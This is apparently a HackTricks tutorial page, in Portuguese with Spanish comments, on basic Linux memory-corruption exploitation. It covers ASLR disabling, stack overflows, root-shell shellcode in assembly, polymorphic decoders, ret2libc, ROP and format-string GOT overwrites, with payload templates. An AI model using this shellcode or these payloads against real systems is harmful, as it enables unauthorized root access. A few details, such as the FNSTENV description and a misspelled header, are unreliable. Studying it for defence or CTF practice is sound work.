# Linux Exploiting (B√°sico) (SPA)

## Linux Exploiting (B√°sico) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Aleatoriza√ß√£o de endere√ßos

**Desativar aleatoriza√ß√£o (ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reativar aleatoriza√ß√£o GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desativar para uma execu√ß√£o** (n√£o requer root):\
setarch \`arch\` -R ./exemplo argumentos\
setarch \`uname -m\` -R ./exemplo argumentos

**Desativar prote√ß√£o de execu√ß√£o na pilha**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemplo.c -o exemplo

**Arquivo core**\
ulimit -c unlimited\
gdb /exec arquivo\_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texto**\
**Dados**\
**BSS**\
**Heap**

**Pilha**

**Se√ß√£o BSS**: Vari√°veis globais ou est√°ticas n√£o inicializadas
```
static int i;
```
**Se√ß√£o DATA**: Vari√°veis globais ou est√°ticas inicializadas
```
int i = 5;
```
**Se√ß√£o TEXT**: Instru√ß√µes de c√≥digo (opcodes)

**Se√ß√£o HEAP**: Buffers alocados dinamicamente (malloc(), calloc(), realloc())

**Se√ß√£o STACK**: A pilha (argumentos passados, strings de ambiente (env), vari√°veis locais...)

## **1. ESTOUROS DE PILHA**

> estouro de buffer, sobrecarga de buffer, estouro de pilha, esmagamento de pilha

Falha de segmenta√ß√£o ou viola√ß√£o de segmento: quando se tenta acessar um endere√ßo de mem√≥ria que n√£o foi atribu√≠do ao processo.

Para obter o endere√ßo de uma fun√ß√£o dentro de um programa, pode-se fazer:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chamada para sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrup√ß√µes do kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento para passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> D√°-nos um execut√°vel formado pelo c√≥digo assembly e podemos obter os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificarmos se √© realmente a nossa shellcode e obtermos os OpCodes

**Verificar se a shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
            void (*fp) (void);
            fp = (void *)shellcode;
            fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
To verify that system calls are being made correctly, the previous program must be compiled and the system calls must appear in **strace ./COMPILED\_PROGRAM**

When creating shellcodes, a trick can be performed. The first instruction is a jump to a call. The call calls the original code and also puts the EIP on the stack. After the call instruction, we have inserted the string we need, so with that EIP we can point to the string and also continue executing the code.

EXAMPLE **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax            
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack (/bin/sh):**

Neste exerc√≠cio, vamos explorar uma vulnerabilidade de estouro de buffer em um programa que usa a fun√ß√£o `strcpy()` sem verificar o tamanho do buffer de destino. Vamos aproveitar essa vulnerabilidade para injetar um shellcode no programa e obter um shell de root.

O programa vulner√°vel √© um programa simples que copia a entrada do usu√°rio para um buffer usando a fun√ß√£o `strcpy()`. O buffer tem um tamanho fixo de 64 bytes, mas a fun√ß√£o `strcpy()` n√£o verifica o tamanho do buffer de destino, o que permite que o usu√°rio insira mais de 64 bytes e cause um estouro de buffer.

Nosso objetivo √© explorar essa vulnerabilidade para injetar um shellcode no programa e obter um shell de root. Para fazer isso, vamos usar um shellcode que executa o comando `/bin/sh` e injet√°-lo no buffer de entrada do programa. Quando o programa executa o shellcode, ele executa o comando `/bin/sh` e nos d√° um shell de root.

Este exerc√≠cio √© um exemplo b√°sico de como explorar uma vulnerabilidade de estouro de buffer e injetar um shellcode em um programa vulner√°vel. √â importante lembrar que a explora√ß√£o de vulnerabilidades em sistemas ou aplicativos sem autoriza√ß√£o √© ilegal e pode resultar em consequ√™ncias graves.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

A instru√ß√£o `FNSTENV` √© usada para armazenar o estado atual do coprocessador em uma vari√°vel de ambiente. O registrador `ESP` √© usado para apontar para a vari√°vel de ambiente. O tamanho da vari√°vel de ambiente √© de 28 bytes. A instru√ß√£o `EJ FNSTENV` √© usada para armazenar o estado atual do coprocessador em uma vari√°vel de ambiente e, em seguida, pular para o endere√ßo especificado.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

O Egg Hunter √© um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode armazenada l√° (procurando por alguma assinatura colocada na shellcode). √â √∫til nos casos em que h√° apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes polim√≥rficos**

S√£o shells criptografadas que possuem um pequeno c√≥digo que as descriptografa e salta para ela, usando o truque de Call-Pop. Um exemplo disso seria um **exemplo cifrado de C√©sar**:
```
global _start
_start:
            jmp short magic
init:
            pop     esi
            xor      ecx, ecx
            mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
            sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
            sub     cl, 1
            jnz       desc
            jmp     short sc
magic:
            call init
sc:
            ;Aqu√≠ va el shellcode
```
1. **Atacando o Frame Pointer (EBP)**

√ötil em uma situa√ß√£o em que podemos modificar o EBP, mas n√£o o EIP.

Sabe-se que ao sair de uma fun√ß√£o, o seguinte c√≥digo em assembly √© executado:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Desta forma, se pode modificar o EBP ao sair de uma fun√ß√£o (fvuln) que foi chamada por outra fun√ß√£o, quando a fun√ß√£o que chamou fvuln terminar, seu EIP pode ser modificado.

Em fvuln, pode-se introduzir um EBP falso que aponte para um local onde esteja a dire√ß√£o da shellcode + 4 (√© necess√°rio somar 4 por causa do pop). Assim, ao sair da fun√ß√£o, o valor de &(\&Shellcode)+4 ser√° colocado em ESP, com o pop, 4 ser√° subtra√≠do de ESP e ele apontar√° para a dire√ß√£o da shellcode quando o ret for executado.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + preenchimento + &(\&Shellcode)+4

**Exploit Off-by-One**\
Permite modificar apenas o byte menos significativo do EBP. Pode-se realizar um ataque como o anterior, mas a mem√≥ria que guarda a dire√ß√£o da shellcode deve compartilhar os 3 primeiros bytes com o EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til quando o stack n√£o √© execut√°vel ou deixa um buffer muito pequeno para modificar.

O ASLR faz com que em cada execu√ß√£o as fun√ß√µes sejam carregadas em posi√ß√µes distintas da mem√≥ria. Portanto, este m√©todo pode n√£o ser efetivo nesse caso. Para servidores remotos, como o programa est√° sendo executado constantemente no mesmo endere√ßo, pode ser √∫til.

* **cdecl (C declaration)** Coloca os argumentos no stack e ap√≥s sair da fun√ß√£o limpa a pilha
* **stdcall (standard call)** Coloca os argumentos na pilha e √© a fun√ß√£o chamada que a limpa
* **fastcall** Coloca os dois primeiros argumentos em registradores e o resto na pilha

Coloca-se o endere√ßo da instru√ß√£o system de libc e passa-se como argumento a string ‚Äú/bin/sh‚Äù, normalmente de uma vari√°vel de ambiente. Al√©m disso, usa-se o endere√ßo da fun√ß√£o exit para que, uma vez que a shell n√£o seja mais necess√°ria, o programa saia sem problemas (e escreva logs).

**export SHELL=/bin/sh**

Para encontrar os endere√ßos que precisamos, pode-se olhar dentro do **GDB:**\
**p system**\
**p exit**\
**rabin2 -i execut√°vel** ‚Äî> D√° o endere√ßo de todas as fun√ß√µes que o programa usa ao carregar\
(Dentro de um start ou algum breakpoint): **x/500s $esp** ‚Äî> Procuramos aqui a string /bin/sh

Uma vez que tenhamos esses endere√ßos, o **exploit** ficaria assim:

‚ÄúA‚Äù \* DIST√ÇNCIA EBP + 4 (EBP: podem ser 4 "A"s, embora seja melhor se for o EBP real para evitar falhas de segmenta√ß√£o) + Endere√ßo de **system** (sobrescrever√° o EIP) + Endere√ßo de **exit** (ao sair de system(‚Äú/bin/sh‚Äù), esta fun√ß√£o ser√° chamada, pois os primeiros 4 bytes do stack s√£o tratados como o pr√≥ximo endere√ßo do EIP a ser executado) + Endere√ßo de ‚Äú**/bin/sh**‚Äù (ser√° o par√¢metro passado para system)

Desta forma, o EIP ser√° sobrescrito com o endere√ßo de system, que receber√° como par√¢metro a string ‚Äú/bin/sh‚Äù e, ao sair dele, executar√° a fun√ß√£o exit().

√â poss√≠vel encontrar-se na situa√ß√£o em que algum byte de algum endere√ßo de alguma fun√ß√£o seja nulo ou espa√ßo (\x20). Nesse caso, pode-se desmontar os endere√ßos anteriores a essa fun√ß√£o, pois provavelmente haver√° v√°rios NOPs que nos permitir√£o chamar um deles em vez da fun√ß√£o diretamente (por exemplo, com > x/8i system-4).

Este m√©todo funciona porque, ao chamar uma fun√ß√£o como system usando o opcode **ret** em vez de **call**, a fun√ß√£o entende que os primeiros 4 bytes ser√£o o endere√ßo **EIP** para o qual voltar.

Uma t√©cnica interessante com este m√©todo √© chamar **strncpy()** para mover um payload do stack para o heap e posteriormente usar **gets()** para executar esse payload.

Outra t√©cnica interessante √© o uso de **mprotect()**, que permite atribuir as permiss√µes desejadas a qualquer parte da mem√≥ria. Serve ou servia em BDS, MacOS e OpenBSD, mas n√£o em linux (controla que n√£o seja poss√≠vel conceder permiss√µes de escrita e execu√ß√£o ao mesmo tempo). Com esse ataque, pode-se reconfigurar o stack como execut√°vel.

**Encadeamento de fun√ß√µes**

Com base na t√©cnica anterior, esta forma de exploit consiste em:\
Preenchimento + \&Fun√ß√£o1 + \&pop;ret; + \&arg\_fun1 + \&Fun√ß√£o2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

Desta forma, podem-se encadear fun√ß√µes a serem chamadas. Al√©m disso, se quiser usar fun√ß√µes com v√°rios argumentos, pode-se colocar os argumentos necess√°rios (por exemplo, 4) e colocar os 4 argumentos e procurar o endere√ßo em um local com opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d execut√°vel**

**Encadeamento por falsifica√ß√£o de frames (encadeamento de EBPs)**

Consiste em aproveitar o poder de manipular o EBP para ir encadeando a execu√ß√£o de v√°rias fun√ß√µes atrav√©s do EBP e de "leave;ret"

PREENCHIMENTO

* Coloca-se no EBP um EBP falso que aponta para: 2¬∫ EBP\_falso + a fun√ß√£o a ser executada: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* No EIP, coloca-se como endere√ßo uma fun√ß√£o &(leave;ret)

Inicia-se a shellcode com o endere√ßo da pr√≥xima parte da shellcode, por exemplo: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

o 2¬∫EBP seria: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Esta shellcode pode ser repetida indefinidamente nas partes da mem√≥ria √†s quais se tenha acesso, de forma que se conseguir√° uma shellcode facilmente divis√≠vel por pequenos peda√ßos de mem√≥ria.

(Encadeia a execu√ß√£o de fun√ß√µes misturando as vulnerabilidades vistas anteriormente de EBP e de ret2lib)

## **5. M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o se pode colocar um endere√ßo do stack no EIP (verifica-se que o EIP n√£o cont√©m 0xbf) ou quando n√£o se pode calcular a localiza√ß√£o da shellcode. Mas, a fun√ß√£o vulner√°vel aceita um par√¢metro (a shellcode ir√° aqui).

Desta forma, ao mudar o EIP por um endere√ßo de um **ret**, a pr√≥xima dire√ß√£o ser√° carregada (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, a shellcode ser√° carregada.

O exploit ficaria assim: SHELLCODE + Preenchimento (at√© EIP) + **\&ret** (os pr√≥ximos bytes da pilha apontam para o in√≠cio da shellcode, pois a dire√ß√£o do par√¢metro passado √© colocada no stack)

Parece que fun√ß√µes como **strncpy** uma vez completas eliminam da pilha o endere√ßo onde a shellcode estava armazenada, impossibilitando esta t√©cnica. Ou seja, o endere√ßo que passam para a fun√ß√£o como argumento (o que guarda a shellcode) √© modificado por um 0x00, de modo que, ao chamar o segundo **ret**, encontra um 0x00 e o programa morre.
```
        **Ret2PopRet**
```
Se n√£o tivermos controle sobre o primeiro argumento, mas sim sobre o segundo ou terceiro, podemos sobrescrever o EIP com um endere√ßo para pop-ret ou pop-pop-ret, dependendo do que precisamos.

**T√©cnica de Murat**

No Linux, todos os programas s√£o mapeados come√ßando em 0xbfffffff.

Observando como a pilha de um novo processo √© constru√≠da no Linux, √© poss√≠vel desenvolver um exploit de forma que o programa seja iniciado em um ambiente cuja √∫nica vari√°vel seja a shellcode. O endere√ßo desta pode ent√£o ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME\_do\_execut√°vel\_completo) - strlen(shellcode)

Desta forma, a vari√°vel de ambiente com a shellcode pode ser facilmente obtida.

Isso √© poss√≠vel gra√ßas √† fun√ß√£o execle, que permite criar um ambiente que tenha apenas as vari√°veis de ambiente desejadas.

**Jump to ESP: Estilo Windows**

Devido ao fato de o ESP sempre apontar para o in√≠cio da pilha, esta t√©cnica consiste em substituir o EIP pelo endere√ßo de uma chamada a **jmp esp** ou **call esp**. Dessa forma, a shellcode √© salva ap√≥s a sobrescrita do EIP, j√° que ap√≥s a execu√ß√£o do **ret**, o ESP estar√° apontando para o endere√ßo seguinte, exatamente onde a shellcode foi salva.

Caso o ASLR n√£o esteja ativado no Windows ou no Linux, √© poss√≠vel chamar **jmp esp** ou **call esp** armazenados em algum objeto compartilhado. Caso o ASLR esteja ativado, √© poss√≠vel procurar dentro do pr√≥prio programa vulner√°vel.

Al√©m disso, o fato de poder colocar a shellcode ap√≥s a corrup√ß√£o do EIP, em vez de no meio da pilha, permite que as instru√ß√µes push ou pop que s√£o executadas no meio da fun√ß√£o n√£o toquem na shellcode (o que poderia ocorrer se ela fosse colocada no meio da pilha da fun√ß√£o).

De forma muito semelhante a isso, se soubermos que uma fun√ß√£o retorna o endere√ßo onde a shellcode est√° armazenada, √© poss√≠vel chamar **call eax** ou **jmp eax (ret2eax).**

**ROP (Programa√ß√£o Orientada a Retorno) ou peda√ßos de c√≥digo emprestados**

Os peda√ßos de c√≥digo que s√£o invocados s√£o conhecidos como gadgets.

Essa t√©cnica consiste em encadear diferentes chamadas de fun√ß√µes usando a t√©cnica **ret2libc** e o uso de **pop,ret**.

Em algumas arquiteturas de processadores, cada instru√ß√£o √© um conjunto de 32 bits (MIPS, por exemplo). No entanto, na Intel, as instru√ß√µes t√™m tamanho vari√°vel e v√°rias instru√ß√µes podem compartilhar um conjunto de bits, por exemplo:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Cont√©m os bytes 0xffe4, que tamb√©m s√£o traduzidos como: **jmp \*%esp**

Dessa forma, √© poss√≠vel executar algumas instru√ß√µes que nem mesmo est√£o no programa original.

**ROPgadget.py** ajuda a encontrar valores em bin√°rios.

Este programa tamb√©m serve para criar os **payloads**. Voc√™ pode fornecer a biblioteca da qual deseja extrair os ROPs e ele gerar√° um payload em Python, ao qual voc√™ fornece o endere√ßo em que a biblioteca est√° e o payload est√° pronto para ser usado como shellcode. Al√©m disso, como usa chamadas de sistema, ele n√£o executa nada na pilha, apenas vai salvando endere√ßos de ROPs que ser√£o executados por meio de **ret**. Para usar esse payload, √© necess√°rio cham√°-lo por meio de uma instru√ß√£o **ret**.

**Estouro de inteiros**

Esse tipo de estouro ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o que √© passado para ela, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
No exemplo anterior, vemos que o programa espera 2 par√¢metros. O primeiro √© o comprimento da pr√≥xima string e o segundo √© a string.

Se passarmos um n√∫mero negativo como primeiro par√¢metro, ser√° exibido que len < 256 e passaremos por esse filtro, e tamb√©m strlen(buffer) ser√° menor que l, pois l √© unsigned int e ser√° muito grande.

Esse tipo de overflow n√£o busca escrever algo no processo do programa, mas sim superar filtros mal projetados para explorar outras vulnerabilidades.

**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir e pode ser interessante observ√°-la. Pode ser que ela assuma o valor que uma vari√°vel da fun√ß√£o anterior assumia e que esta seja controlada pelo atacante.

## **Format Strings**

Em C, **`printf`** √© uma fun√ß√£o que pode ser usada para **imprimir** uma string. O **primeiro par√¢metro** que essa fun√ß√£o espera √© o **texto bruto com os formatadores**. Os **par√¢metros seguintes** esperados s√£o os **valores** para **substituir** os **formatadores** do texto bruto.

A vulnerabilidade aparece quando um **texto do atacante √© colocado como primeiro argumento** para essa fun√ß√£o. O atacante poder√° criar uma **entrada especial abusando das capacidades de formata√ß√£o do printf** para **escrever qualquer dado em qualquer endere√ßo**. Dessa forma, √© poss√≠vel **executar c√≥digo arbitr√°rio**.

Formatadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escreve** o **n√∫mero de bytes escritos** no **endere√ßo indicado. Escrever** tantos **bytes** quanto o n√∫mero hexadecimal que precisamos escrever √© como podemos **escrever qualquer dado**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### \*\*GOT (Tabela Global de Deslocamentos) / PLT (\*\*Tabela de Liga√ß√£o de Procedimentos)

Esta √© a tabela que cont√©m o **endere√ßo** das **fun√ß√µes externas** usadas pelo programa.

Obtenha o endere√ßo desta tabela com: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observe como depois de **carregar** o **execut√°vel** no GEF voc√™ pode **ver** as **fun√ß√µes** que est√£o na **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando o GEF voc√™ pode **iniciar** uma **sess√£o de depura√ß√£o** e executar **`got`** para ver a tabela got:

![](<../../.gitbook/assets/image (621).png>)

Em um bin√°rio, a GOT tem os **endere√ßos das fun√ß√µes ou** da **se√ß√£o PLT** que carregar√° o endere√ßo da fun√ß√£o. O objetivo deste exploit √© **substituir a entrada GOT** de uma fun√ß√£o que ser√° executada mais tarde **pelo endere√ßo do PLT da fun√ß√£o `system`**. Idealmente, voc√™ ir√° **substituir** a **GOT** de uma **fun√ß√£o** que est√° **prestes a ser chamada com par√¢metros controlados por voc√™** (para que voc√™ possa controlar os par√¢metros enviados para a fun√ß√£o do sistema).

Se **`system`** **n√£o for usada** pelo script, a fun√ß√£o do sistema **n√£o ter√° uma entrada na GOT**. Nesse cen√°rio, voc√™ precisar√° **vazar primeiro o endere√ßo** da fun√ß√£o `system`.

A **Tabela de Liga√ß√£o de Procedimentos** √© uma tabela **somente leitura** no arquivo ELF que armazena todos os **s√≠mbolos necess√°rios que precisam de resolu√ß√£o**. Quando uma dessas fun√ß√µes √© chamada, a **GOT** ir√° **redirecionar** o **fluxo** para o **PLT** para que ele possa **resolver** o **endere√ßo** da fun√ß√£o e escrev√™-lo na GOT.\
Ent√£o, na **pr√≥xima vez** que uma chamada for realizada para esse endere√ßo, a **fun√ß√£o** √© **chamada diretamente** sem precisar resolv√™-la.

Voc√™ pode ver os endere√ßos PLT com **`objdump -j .plt -d ./vuln_binary`**

### **Fluxo de Explora√ß√£o**

Como explicado anteriormente, o objetivo ser√° **sobrescrever** o **endere√ßo** de uma **fun√ß√£o** na tabela **GOT** que ser√° chamada posteriormente. Idealmente, poder√≠amos definir o **endere√ßo para um shellcode** localizado em uma se√ß√£o execut√°vel, mas √© altamente prov√°vel que voc√™ n√£o consiga escrever um shellcode em uma se√ß√£o execut√°vel.\
Ent√£o, uma op√ß√£o diferente √© **sobrescrever** uma **fun√ß√£o** que **recebe** seus **argumentos** do **usu√°rio** e **apont√°-la** para a **fun√ß√£o `system`**.

Para escrever o endere√ßo, geralmente s√£o feitos 2 passos: voc√™ **primeiro escreve 2Bytes** do endere√ßo e depois os outros 2. Para fazer isso, √© usado **`$hn`**.

**HOB** √© chamado para os 2 bytes mais altos do endere√ßo\
**LOB** √© chamado para os 2 bytes mais baixos do endere√ßo

Ent√£o, por causa de como a string de formato funciona, voc√™ precisa **escrever primeiro o menor** de \[HOB, LOB] e depois o outro.

Se HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Modelo de Explora√ß√£o de String de Formato**

Voc√™ pode encontrar um **modelo** para explorar a GOT usando strings de formato aqui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes que o programa termine. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar para o main novamente para **explorar a string de formato uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
 8049934 a0850408

#Put your address in 0x8049934
```
Observe que isso **n√£o** **criar√°** um **loop eterno** porque quando voc√™ voltar para o principal, o can√°rio perceber√°, o final da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Ent√£o, com isso, voc√™ poder√° **ter mais uma execu√ß√£o** da vulnerabilidade.

### **Strings de formato para extrair conte√∫do**

Uma string de formato tamb√©m pode ser usada para **extrair conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o, h√° uma **vari√°vel local na pilha apontando para uma flag**. Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer com que o **printf acesse** esse **endere√ßo** e **imprima** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E a partir do vazamento, voc√™ pode ver que o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Ent√£o, **acessando** o **8¬∫ par√¢metro**, voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Observe que, seguindo o **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para o **`printf`** na se√ß√£o onde o **execut√°vel** √© **carregado** e **extrair** tudo **inteiramente**!

### **DTOR**

{% hint style="danger" %}
Hoje em dia √© muito **incomum encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes que o programa termine.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalmente, voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Portanto, se voc√™ apenas vir esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Ent√£o, **sobrescreva** o **`00000000`** com o **endere√ßo** do **shellcode** para execut√°-lo.

### **Strings de formato para estouro de buffer**

O **sprintf** move uma string formatada para uma vari√°vel. Portanto, voc√™ pode abusar da formata√ß√£o de uma string para causar um estouro de buffer na vari√°vel para onde o conte√∫do √© copiado. Por exemplo, a carga √∫til `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito **estranho explorar isso**.
{% endhint %}

**`Atexit()`** √© uma fun√ß√£o para a qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ pode **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ **ganhar√° controle** do **processo**, mas isso √© atualmente mais complicado.\
